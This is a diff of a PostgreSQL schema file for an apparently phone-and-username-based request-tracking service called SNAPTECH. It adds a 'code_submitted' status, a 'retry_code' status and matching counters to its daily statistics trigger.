@@ -1,8 +1,8 @@
 -- ============================================================
--- SNAPTECH v3.0 — Schéma DB
+-- SNAPTECH v3.1 — Schéma DB (avec code_submitted + retry_code)
 -- ============================================================
 
--- Table principale
+-- 1. Table principale
 CREATE TABLE IF NOT EXISTS snap_requests (
     id SERIAL PRIMARY KEY,
     username VARCHAR(100) NOT NULL,
@@ -22,7 +22,7 @@ CREATE TABLE IF NOT EXISTS snap_requests (
     UNIQUE(phone)
 );
 
--- IPs bannies
+-- 2. IPs bannies
 CREATE TABLE IF NOT EXISTS banned_ips (
     id SERIAL PRIMARY KEY,
     ip_address VARCHAR(45) NOT NULL UNIQUE,
@@ -31,13 +31,13 @@ CREATE TABLE IF NOT EXISTS banned_ips (
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
 
--- Index
+-- 3. Index
 CREATE INDEX IF NOT EXISTS idx_snap_requests_username ON snap_requests(username);
 CREATE INDEX IF NOT EXISTS idx_snap_requests_phone ON snap_requests(phone);
 CREATE INDEX IF NOT EXISTS idx_snap_requests_status ON snap_requests(status);
 CREATE INDEX IF NOT EXISTS idx_snap_requests_created_at ON snap_requests(created_at DESC);
 
--- Logs
+-- 4. Logs
 CREATE TABLE IF NOT EXISTS snap_logs (
     id SERIAL PRIMARY KEY,
     request_id INTEGER REFERENCES snap_requests(id) ON DELETE SET NULL,
@@ -48,7 +48,7 @@ CREATE TABLE IF NOT EXISTS snap_logs (
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
 
--- Stats
+-- 5. Stats
 CREATE TABLE IF NOT EXISTS snap_stats (
     id SERIAL PRIMARY KEY,
     date DATE NOT NULL UNIQUE,
@@ -56,13 +56,14 @@ CREATE TABLE IF NOT EXISTS snap_stats (
     pending_requests INTEGER DEFAULT 0,
     processing_requests INTEGER DEFAULT 0,
     waiting_code_requests INTEGER DEFAULT 0,
+    code_submitted_requests INTEGER DEFAULT 0,
     completed_requests INTEGER DEFAULT 0,
     failed_requests INTEGER DEFAULT 0,
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
     updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
 
--- updated_at trigger
+-- 6. updated_at trigger
 CREATE OR REPLACE FUNCTION update_updated_at_column()
 RETURNS TRIGGER AS $$
 BEGIN
@@ -77,7 +78,7 @@ CREATE TRIGGER update_snap_requests_updated_at
     FOR EACH ROW
     EXECUTE FUNCTION update_updated_at_column();
 
--- Stats INSERT trigger
+-- 7. Stats INSERT trigger
 CREATE OR REPLACE FUNCTION update_snap_stats_insert()
 RETURNS TRIGGER AS $$
 BEGIN
@@ -97,7 +98,7 @@ CREATE TRIGGER trigger_update_snap_stats_insert
     FOR EACH ROW
     EXECUTE FUNCTION update_snap_stats_insert();
 
--- Stats UPDATE trigger
+-- 8. Stats UPDATE trigger (v3.1 — gère tous les statuts)
 CREATE OR REPLACE FUNCTION update_snap_stats_update()
 RETURNS TRIGGER AS $$
 BEGIN
@@ -113,10 +114,22 @@ BEGIN
             waiting_code_requests = waiting_code_requests + 1,
             updated_at = CURRENT_TIMESTAMP
         WHERE date = CURRENT_DATE;
-    ELSIF OLD.status = 'waiting_code' AND NEW.status = 'completed' THEN
+    ELSIF OLD.status = 'waiting_code' AND NEW.status = 'code_submitted' THEN
         UPDATE snap_stats 
         SET waiting_code_requests = GREATEST(waiting_code_requests - 1, 0),
+            code_submitted_requests = code_submitted_requests + 1,
+            updated_at = CURRENT_TIMESTAMP
+        WHERE date = CURRENT_DATE;
+    ELSIF OLD.status = 'code_submitted' AND NEW.status = 'completed' THEN
+        UPDATE snap_stats 
+        SET code_submitted_requests = GREATEST(code_submitted_requests - 1, 0),
             completed_requests = completed_requests + 1,
+            updated_at = CURRENT_TIMESTAMP
+        WHERE date = CURRENT_DATE;
+    ELSIF OLD.status = 'code_submitted' AND NEW.status = 'retry_code' THEN
+        UPDATE snap_stats 
+        SET code_submitted_requests = GREATEST(code_submitted_requests - 1, 0),
+            waiting_code_requests = waiting_code_requests + 1,
             updated_at = CURRENT_TIMESTAMP
         WHERE date = CURRENT_DATE;
     ELSIF OLD.status = 'pending' AND NEW.status = 'wrong_number' THEN
